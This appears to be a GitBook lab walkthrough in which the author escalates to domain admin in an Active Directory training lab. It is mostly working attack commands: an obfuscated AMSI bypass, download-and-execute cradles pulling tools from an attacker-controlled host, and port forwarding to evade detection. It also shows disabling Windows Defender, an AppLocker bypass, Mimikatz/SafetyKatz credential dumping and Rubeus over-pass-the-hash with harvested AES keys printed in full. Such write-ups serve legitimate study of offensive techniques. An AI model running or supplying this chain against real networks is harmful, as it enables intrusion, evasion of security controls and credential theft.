# 🪜 Domain admin session in target domain -> escalate privileges

We have access to two domain users - student613 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

We can use Powerview's Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging.

First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.

We are going to start by using **Find-DomainUserLocation** on the reverse shell we got earlier as ciadmin to looks for machines where a domain admin is logged in.

{% embed url="https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/" %}

So we start by hosting our web server using wsl to bypass Enhanced Script Block Logging. Unfortunately, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle.

```
iex (iwr http://172.16.100.13/sbloggingbypass.txt -UseBasicParsing)
```

Then we use the below command to bypass AMSI:

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Then we had a tip from a guy on discord to host a web server using WSL rather than hfs.exe ->

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We then download power View on the target machine and launch the following command: Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in.&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.13:6565/PowerView.ps1'))
```

```
Find-DomainUserLocation
```

The command `Find-DomainUserLocation` from the PowerSploit framework is used to find the location (computer) where a specific user is currently logged in within a domain.

* **UserDomain**: `dcorp`
  * The domain in which the user account resides. In this case, the user `svcadmin` belongs to the `dcorp` domain.
* **UserName**: `svcadmin`
  * The username of the account for which the current location is being identified. Here, `svcadmin` is likely a service account.
* **ComputerName**: `dcorp-mgmt.dollarcorp.moneycorp.local`
  * The fully qualified domain name (FQDN) of the computer where the user is currently logged in. In this example, `svcadmin` is logged into the computer named `dcorp-mgmt.dollarcorp.moneycorp.local`.

We can see that there is a domain admin session on dcorp-mgmt server!

<figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

This means in the network we're going to go through this path:

<figure><img src="../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>

* The user `svcadmin` is logged into the server `dcorp-mgmt.dollarcorp.moneycorp.local`.
* This user has domain admin privileges, which means they have high-level administrative access to the domain `dcorp`

**Abuse with Winrs**

Now, we have to check if we can execute commands on dcorp-mgmt server and if the winrm port is open:

`winrs` (Windows Remote Shell) is a command-line tool that allows you to execute commands on remote Windows machines. It is similar to SSH for Windows systems.

```
winrs -r:dcorp-mgmt set computername;set username
```

So we see that we can execute code on the dcorp-mgmt machine:

<figure><img src="../../.gitbook/assets/image (1089).png" alt=""><figcaption><p>Now we need to abuse the machine</p></figcaption></figure>

First we need to copy the Loader.exe to dcorp-mgmt:

First we copy it to our reverse shell then we load it on the target machine ->

```
iwr http://172.16.100.13:6565/Loader.exe -OutFile C:\Users\Public\Loader.exe
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We need to avoid detection on  `dcorp-mgmt` by setting up port forwarding. This will allow traffic to be redirected from one port to another, effectively masking the original connection.

```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13"
```

Then i wanted to run SafetyKatz

```
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.13:6565/SafetyKatz.exe sekurlsa::ekeys exit
```

And unexpectedly it worked without any problems ->

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>*ThisisBlasphemyThisisMadness!! // 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</p></figcaption></figure>

Now with these credentials, we are going to go and perform Over pass the hash and use svcadmin's creds. On the student VM we're going to run an elevated shell and try to bypass potential detection:

<figure><img src="../../.gitbook/assets/image (1080).png" alt=""><figcaption></figcaption></figure>

And now we run the Rubeus command with %Pwn% as _asktgt_ command

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (1090).png" alt=""><figcaption></figcaption></figure>

We can see that %Pwn% was interpreted as asktgt, we succesfully got our TGT and it poped a shell (on the right) and we were able to execute code on domain controller

<figure><img src="../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>

_**Process of this attack:**_

1. We load Loader.exe to dcorp-mgmt via our jenkins shell (dcorp-ci)
2. After port forwarding we use SafetyKatz to get svcadmin credentials
3. We use Rubeus to perform over pass the hash to forge a TGT
4. We succesfully forge the ticket and we can access the domain controller

***

For the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges. On a PowerShell session started using Invisi-Shell, enter the following command.

After running the following command,

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1				
Find-PSRemotingLocalAdminAccess			
```

We see that we have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (**to run SafetKatz from memory**) results in error 'This program is blocked by group policy.'

This could be because of an application allolist on dcorp-adminsrv and we drop into a Constrained Language Mode (CLM) when using PSRemoting.

Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys.

```
winrs -r:dcorp-adminsrv cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

Looks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../../.gitbook/assets/image (1094).png" alt=""><figcaption></figcaption></figure>

So everyone can run scripts from the C:\ProgramFiles folder

cd We could've checked that with the following command:

```
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

Before abusing this, we need to disable Windows defender:

```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1) because of the Constrained Language Mode. So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.

To bypass this we would to:

* Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.
* Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).
* Add "Invoke-Mimi -Command '"sekurlsa::ekeys"' " (without quotes) to the end of the file

Now from our student VM we transfer our file:

```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Here we see that the command was succesful:

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we just have to run the file and collect our hashes:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So now we can ask for a tgt with rubeus, on local machine open a elevated cmd and set those values to bypass defender:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we ask for a tgt with the new hashes we got:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Then a shell will spawn with srvadmin privileges, we just have to check if srvadmin has admin privileges on any other machine:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we can see we have local admin on dcorp-mgmt and dcorp-adminsrv

We now need to transfer Loader.exe and Safty.bat

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
echo F | xcopy C:\AD\Tools\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We now need to run Invoke-mimi on dcorp-mgmt

```
winrs -r:dcorp-mgmt cmd
```

We start by getting our shell then bypass AMSI to download the ps1 script:

```
[AMSI bypass script]
iex (iwr http://172.16.100.13:6565/Invoke-Mimi.ps1 -UseBasicParsing)
 Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

And after that we can use Invoke-Mimi

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Invoke-Mimi for extracting credentials from credentials vault**

&#x20;We can also look for credentials from the credentials vault. Interesting credentials like those used for scheduled tasks are stored in the credential vault.

```
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And finaly we can use the hash we found on the Student VM to perform Over Pass the hash

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

